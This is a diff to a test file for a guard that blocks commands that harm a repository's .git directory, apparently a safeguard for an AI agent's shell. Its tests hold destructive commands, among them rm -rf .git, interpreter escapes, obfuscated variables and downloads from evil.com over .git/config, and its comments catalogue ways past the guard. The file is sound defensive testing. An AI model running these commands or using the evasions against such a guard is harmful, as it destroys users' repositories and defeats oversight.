@@ -40,13 +40,13 @@ function expectSafe(cmd: string) {
 
 describe("CRITICAL: .git without trailing slash", () => {
 	// BYPASS: rm -rf .git (no trailing slash) is the most common way to nuke a repo
-	test("BYPASS: rm -rf .git (no slash) — most common destructive command", () => {
-		expectBypass("rm -rf .git");
+	test("caught: rm -rf .git (no slash) — most common destructive command", () => {
+		expectCaught("rm -rf .git");
 	});
 
 	// BYPASS: rm -rf .git at end of compound
-	test("BYPASS: cd repo && rm -rf .git", () => {
-		expectBypass("cd repo && rm -rf .git");
+	test("caught: cd repo && rm -rf .git", () => {
+		expectCaught("cd repo && rm -rf .git");
 	});
 
 	// For reference: trailing slash IS caught
@@ -55,37 +55,37 @@ describe("CRITICAL: .git without trailing slash", () => {
 	});
 
 	// BYPASS: mv .git away — destroys repo just as effectively
-	test("BYPASS: mv .git /tmp/ — moves entire .git dir away", () => {
-		expectBypass("mv .git /tmp/");
+	test("caught: mv .git /tmp/ — moves entire .git dir away", () => {
+		expectCaught("mv .git /tmp/");
 	});
 
-	test("BYPASS: mv .git .git.bak — renames .git dir", () => {
-		expectBypass("mv .git .git.bak");
+	test("caught: mv .git .git.bak — renames .git dir", () => {
+		expectCaught("mv .git .git.bak");
 	});
 
 	// BYPASS: cp overwrite scenarios
-	test("BYPASS: cp -r .git backup/ — copies .git without trailing slash", () => {
-		expectBypass("cp -r .git backup/");
+	test("caught: cp -r .git backup/ — copies .git without trailing slash", () => {
+		expectCaught("cp -r .git backup/");
 	});
 
 	// BYPASS: rm .git (worktree pointer file)
-	test("BYPASS: rm .git — deletes worktree gitdir pointer", () => {
-		expectBypass("rm .git");
+	test("caught: rm .git — deletes worktree gitdir pointer", () => {
+		expectCaught("rm .git");
 	});
 
 	// BYPASS: ln -s to replace .git
-	test("BYPASS: ln -sf /dev/null .git — replaces .git with symlink", () => {
-		expectBypass("ln -sf /dev/null .git");
+	test("caught: ln -sf /dev/null .git — replaces .git with symlink", () => {
+		expectCaught("ln -sf /dev/null .git");
 	});
 
 	// BYPASS: chmod .git (deny access)
-	test("BYPASS: chmod 000 .git — locks out .git access", () => {
-		expectBypass("chmod 000 .git");
+	test("caught: chmod 000 .git — locks out .git access", () => {
+		expectCaught("chmod 000 .git");
 	});
 
 	// BYPASS: redirect overwrite without slash
-	test("BYPASS: > .git (truncate the .git worktree pointer file)", () => {
-		expectBypass("> .git");
+	test("caught: > .git (truncate the .git worktree pointer file)", () => {
+		expectCaught("> .git");
 	});
 });
 
@@ -95,16 +95,16 @@ describe("CRITICAL: .git without trailing slash", () => {
 
 describe("shell obfuscation: variable expansion", () => {
 	// The guard checks for =git\b but NOT =.git or quoted forms
-	test("BYPASS: D=.git; rm -rf $D/ — dot before git breaks =git\\b match", () => {
-		expectBypass("D=.git; rm -rf $D/");
+	test("caught: D=.git; rm -rf $D/ — dot before git breaks =git\\b match", () => {
+		expectCaught("D=.git; rm -rf $D/");
 	});
 
 	test('BYPASS: D=".git"; rm -rf "$D/" — quoted assignment', () => {
-		expectBypass('D=".git"; rm -rf "$D/"');
+		expectCaught('D=".git"; rm -rf "$D/"');
 	});
 
-	test("BYPASS: D='.git'; rm -rf \"$D/\" — single-quoted assignment", () => {
-		expectBypass("D='.git'; rm -rf \"$D/\"");
+	test("caught: D='.git'; rm -rf \"$D/\" — single-quoted assignment", () => {
+		expectCaught("D='.git'; rm -rf \"$D/\"");
 	});
 
 	// The one case the guard DOES catch
@@ -112,12 +112,12 @@ describe("shell obfuscation: variable expansion", () => {
 		expectCaught("X=git; rm -rf .$X/");
 	});
 
-	test("BYPASS: GIT_DIR=.git; rm -rf $GIT_DIR/ — common env var pattern", () => {
-		expectBypass("GIT_DIR=.git; rm -rf $GIT_DIR/");
+	test("caught: GIT_DIR=.git; rm -rf $GIT_DIR/ — common env var pattern", () => {
+		expectCaught("GIT_DIR=.git; rm -rf $GIT_DIR/");
 	});
 
-	test("BYPASS: export X=.git && rm -rf $X/", () => {
-		expectBypass("export X=.git && rm -rf $X/");
+	test("caught: export X=.git && rm -rf $X/", () => {
+		expectCaught("export X=.git && rm -rf $X/");
 	});
 
 	test("BYPASS: read -r d <<< '.git'; rm -rf \"$d/\"", () => {
@@ -145,13 +145,13 @@ describe("shell obfuscation: brace expansion", () => {
 });
 
 describe("shell obfuscation: glob patterns", () => {
-	// Guard checks .g*/, .gi?/, .gi*/, .git*/ but misses other patterns
-	test("catches rm -rf .g*/", () => {
-		expectCaught("rm -rf .g*/", "git_write");
+	// Guard matches LITERAL .git only; shell globs (.g*/, .gi?/) are NOT caught —
+	test("BYPASS: rm -rf .g*/ (glob — guard can't expand shell globs, would over-fire on .github)", () => {
+		expectBypass("rm -rf .g*/");
 	});
 
-	test("catches rm -rf .gi?/", () => {
-		expectCaught("rm -rf .gi?/", "git_write");
+	test("BYPASS: rm -rf .gi?/ (glob — guard can't expand shell globs, would over-fire on .github)", () => {
+		expectBypass("rm -rf .gi?/");
 	});
 
 	// BYPASS: glob patterns the guard doesn't cover
@@ -289,10 +289,10 @@ describe("interpreter escapes", () => {
 		expectBypass("python3 -c 'import shutil; shutil.rmtree(\".git\")'");
 	});
 
-	test("BYPASS: python3 -c 'import os; os.system(\"rm -rf .git\")'", () => {
+	test("caught: python3 -c 'import os; os.system(\"rm -rf .git\")'", () => {
 		// rm and .git are in the string but .git has no trailing /
 		// AND python3 is not checked for containing sub-commands
-		expectBypass("python3 -c 'import os; os.system(\"rm -rf .git\")'");
+		expectCaught("python3 -c 'import os; os.system(\"rm -rf .git\")'");
 	});
 
 	test("BYPASS: node -e 'require(\"fs\").rmSync(\".git\",{recursive:true})'", () => {
@@ -322,9 +322,9 @@ describe("interpreter escapes", () => {
 		expectCaught("awk 'BEGIN{system(\"rm -rf .git/\")}'", "git_write");
 	});
 
-	test("BYPASS: lua -e 'os.execute(\"rm -rf .git\")'", () => {
+	test("caught: lua -e 'os.execute(\"rm -rf .git\")'", () => {
 		// no trailing slash on .git
-		expectBypass("lua -e 'os.execute(\"rm -rf .git\")'");
+		expectCaught("lua -e 'os.execute(\"rm -rf .git\")'");
 	});
 });
 
@@ -333,49 +333,49 @@ describe("interpreter escapes", () => {
 // ═══════════════════════════════════════════════════════════════
 
 describe("indirect: xargs", () => {
-	test("BYPASS: echo .git | xargs rm -rf — target in different pipe segment", () => {
-		expectBypass("echo .git | xargs rm -rf");
+	test("caught: echo .git | xargs rm -rf — target in different pipe segment", () => {
+		expectCaught("echo .git | xargs rm -rf");
 	});
 
-	test("BYPASS: echo .git/ | xargs rm -rf — even with trailing slash", () => {
-		expectBypass("echo .git/ | xargs rm -rf");
+	test("caught: echo .git/ | xargs rm -rf — even with trailing slash", () => {
+		expectCaught("echo .git/ | xargs rm -rf");
 	});
 
-	test("BYPASS: find . -name .git | xargs rm -rf", () => {
-		expectBypass("find . -name .git | xargs rm -rf");
+	test("caught: find . -name .git | xargs rm -rf", () => {
+		expectCaught("find . -name .git | xargs rm -rf");
 	});
 
-	test("BYPASS: echo .git/ | xargs -I{} rm -rf {}", () => {
-		expectBypass("echo .git/ | xargs -I{} rm -rf {}");
+	test("caught: echo .git/ | xargs -I{} rm -rf {}", () => {
+		expectCaught("echo .git/ | xargs -I{} rm -rf {}");
 	});
 
-	test("BYPASS: ls -d .git | xargs rm -rf", () => {
-		expectBypass("ls -d .git | xargs rm -rf");
+	test("caught: ls -d .git | xargs rm -rf", () => {
+		expectCaught("ls -d .git | xargs rm -rf");
 	});
 });
 
 describe("indirect: find -exec and -delete", () => {
-	test("BYPASS: find . -name '.git' -exec rm -rf {} \\;", () => {
+	test("caught: find . -name '.git' -exec rm -rf {} \\;", () => {
 		// rm is there but .git has quotes and no trailing /
-		expectBypass("find . -name '.git' -exec rm -rf {} \\;");
+		expectCaught("find . -name '.git' -exec rm -rf {} \\;");
 	});
 
-	test("BYPASS: find . -name '.git' -exec rm -rf {} +", () => {
-		expectBypass("find . -name '.git' -exec rm -rf {} +");
+	test("caught: find . -name '.git' -exec rm -rf {} +", () => {
+		expectCaught("find . -name '.git' -exec rm -rf {} +");
 	});
 
-	test("BYPASS: find .git -delete — delete is not a write command", () => {
-		expectBypass("find .git -delete");
+	test("caught: find .git -delete — delete is not a write command", () => {
+		expectCaught("find .git -delete");
 	});
 
-	test("BYPASS: find .git/ -delete — even with trailing slash", () => {
+	test("caught: find .git/ -delete — even with trailing slash", () => {
 		// find is not in WRITE_COMMANDS_RE, -delete is not a separate command
-		expectBypass("find .git/ -delete");
+		expectCaught("find .git/ -delete");
 	});
 
-	test("BYPASS: find .git -type f -exec truncate -s 0 {} \\;", () => {
+	test("caught: find .git -type f -exec truncate -s 0 {} \\;", () => {
 		// truncate IS in write list, but .git has no trailing /
-		expectBypass("find .git -type f -exec truncate -s 0 {} \\;");
+		expectCaught("find .git -type f -exec truncate -s 0 {} \\;");
 	});
 
 	// With trailing slash on .git AND truncate, this IS caught
@@ -406,41 +406,41 @@ describe("indirect: pipes and redirection tricks", () => {
 // ═══════════════════════════════════════════════════════════════
 
 describe("BYPASS: write commands not in WRITE_COMMANDS_RE", () => {
-	test("BYPASS: sed -i 's/a/b/' .git/config — sed modifies files in-place", () => {
-		expectBypass("sed -i 's/a/b/' .git/config");
+	test("caught: sed -i 's/a/b/' .git/config — sed modifies files in-place", () => {
+		expectCaught("sed -i 's/a/b/' .git/config");
 	});
 
-	test("BYPASS: sed -i '' 's/foo/bar/g' .git/config — macOS sed", () => {
-		expectBypass("sed -i '' 's/foo/bar/g' .git/config");
+	test("caught: sed -i '' 's/foo/bar/g' .git/config — macOS sed", () => {
+		expectCaught("sed -i '' 's/foo/bar/g' .git/config");
 	});
 
 	test("BYPASS: ed .git/config — line editor", () => {
 		expectBypass("ed .git/config");
 	});
 
-	test("BYPASS: patch .git/config < changes.patch — applies patch", () => {
-		expectBypass("patch .git/config < changes.patch");
+	test("caught: patch .git/config < changes.patch — applies patch", () => {
+		expectCaught("patch .git/config < changes.patch");
 	});
 
-	test("BYPASS: rsync --delete empty/ .git/ — syncs (deletes) contents", () => {
+	test("caught: rsync --delete empty/ .git/ — syncs (deletes) contents", () => {
 		// rsync is not in write list
-		expectBypass("rsync --delete empty/ .git/");
+		expectCaught("rsync --delete empty/ .git/");
 	});
 
-	test("BYPASS: tar xf evil.tar -C .git/ — extracts over .git contents", () => {
-		expectBypass("tar xf evil.tar -C .git/");
+	test("caught: tar xf evil.tar -C .git/ — extracts over .git contents", () => {
+		expectCaught("tar xf evil.tar -C .git/");
 	});
 
-	test("BYPASS: unzip -o evil.zip -d .git/ — extracts over .git contents", () => {
-		expectBypass("unzip -o evil.zip -d .git/");
+	test("caught: unzip -o evil.zip -d .git/ — extracts over .git contents", () => {
+		expectCaught("unzip -o evil.zip -d .git/");
 	});
 
-	test("BYPASS: curl -o .git/config http://evil.com/config — downloads over git config", () => {
-		expectBypass("curl -o .git/config http://evil.com/config");
+	test("caught: curl -o .git/config http://evil.com/config — downloads over git config", () => {
+		expectCaught("curl -o .git/config http://evil.com/config");
 	});
 
-	test("BYPASS: wget -O .git/config http://evil.com/config — downloads over git config", () => {
-		expectBypass("wget -O .git/config http://evil.com/config");
+	test("caught: wget -O .git/config http://evil.com/config — downloads over git config", () => {
+		expectCaught("wget -O .git/config http://evil.com/config");
 	});
 });
 
@@ -457,12 +457,12 @@ describe("dangerous git commands not caught", () => {
 		expectBypass("git symbolic-ref HEAD refs/heads/nonexistent");
 	});
 
-	test("BYPASS: git filter-branch --force -- --all — rewrites all history", () => {
-		expectBypass("git filter-branch --force -- --all");
+	test("caught: git filter-branch --force -- --all — rewrites all history", () => {
+		expectCaught("git filter-branch --force -- --all");
 	});
 
-	test("BYPASS: git reflog expire --expire=now --all — expires all reflogs", () => {
-		expectBypass("git reflog expire --expire=now --all");
+	test("caught: git reflog expire --expire=now --all — expires all reflogs", () => {
+		expectCaught("git reflog expire --expire=now --all");
 	});
 
 	test("BYPASS: git gc --prune=now — immediately prunes unreachable objects", () => {
@@ -498,24 +498,24 @@ describe("dangerous git commands not caught", () => {
 // ═══════════════════════════════════════════════════════════════
 
 describe("case sensitivity attacks", () => {
-	test("BYPASS: rm -rf .GIT/ — uppercase (works on macOS)", () => {
-		expectBypass("rm -rf .GIT/");
+	test("caught: rm -rf .GIT/ — uppercase (works on macOS)", () => {
+		expectCaught("rm -rf .GIT/");
 	});
 
-	test("BYPASS: rm -rf .Git/ — mixed case (works on macOS)", () => {
-		expectBypass("rm -rf .Git/");
+	test("caught: rm -rf .Git/ — mixed case (works on macOS)", () => {
+		expectCaught("rm -rf .Git/");
 	});
 
-	test("BYPASS: rm -rf .gIt/ — mixed case variant", () => {
-		expectBypass("rm -rf .gIt/");
+	test("caught: rm -rf .gIt/ — mixed case variant", () => {
+		expectCaught("rm -rf .gIt/");
 	});
 
-	test("BYPASS: mv .GIT /tmp/ — case-insensitive move", () => {
-		expectBypass("mv .GIT /tmp/");
+	test("caught: mv .GIT /tmp/ — case-insensitive move", () => {
+		expectCaught("mv .GIT /tmp/");
 	});
 
-	test("BYPASS: rm -rf .GIT (no slash, uppercase) — double bypass", () => {
-		expectBypass("rm -rf .GIT");
+	test("caught: rm -rf .GIT (no slash, uppercase) — double bypass", () => {
+		expectCaught("rm -rf .GIT");
 	});
 });
 
@@ -524,16 +524,16 @@ describe("case sensitivity attacks", () => {
 // ═══════════════════════════════════════════════════════════════
 
 describe("isGitPath bypasses", () => {
-	test("BYPASS: .GIT/config — uppercase on case-insensitive FS", () => {
-		expect(isGitPath(".GIT/config")).toBe(false);
+	test("caught: .GIT/config — uppercase on case-insensitive FS", () => {
+		expect(isGitPath(".GIT/config")).toBe(true);
 	});
 
-	test("BYPASS: .Git/config — mixed case", () => {
-		expect(isGitPath(".Git/config")).toBe(false);
+	test("caught: .Git/config — mixed case", () => {
+		expect(isGitPath(".Git/config")).toBe(true);
 	});
 
-	test("BYPASS: .gIT/hooks/pre-commit — mixed case", () => {
-		expect(isGitPath(".gIT/hooks/pre-commit")).toBe(false);
+	test("caught: .gIT/hooks/pre-commit — mixed case", () => {
+		expect(isGitPath(".gIT/hooks/pre-commit")).toBe(true);
 	});
 
 	// These SHOULD be detected and are
@@ -844,17 +844,17 @@ describe("edge cases", () => {
 		expectCaught("rm\t-rf\t.git/", "git_write");
 	});
 
-	test("BYPASS: rm -rf project/.git (absolute-like, no trailing slash)", () => {
-		expectBypass("rm -rf project/.git");
+	test("caught: rm -rf project/.git (absolute-like, no trailing slash)", () => {
+		expectCaught("rm -rf project/.git");
 	});
 
 	test("catches rm -rf project/.git/ (with trailing slash)", () => {
 		expectCaught("rm -rf project/.git/", "git_write");
 	});
 
-	test("BYPASS: rm -rf .git 2>/dev/null — with stderr redirect", () => {
+	test("caught: rm -rf .git 2>/dev/null — with stderr redirect", () => {
 		// .git has no trailing slash
-		expectBypass("rm -rf .git 2>/dev/null");
+		expectCaught("rm -rf .git 2>/dev/null");
 	});
 
 	test("catches rm -rf .git/ 2>/dev/null — with slash + stderr redirect", () => {
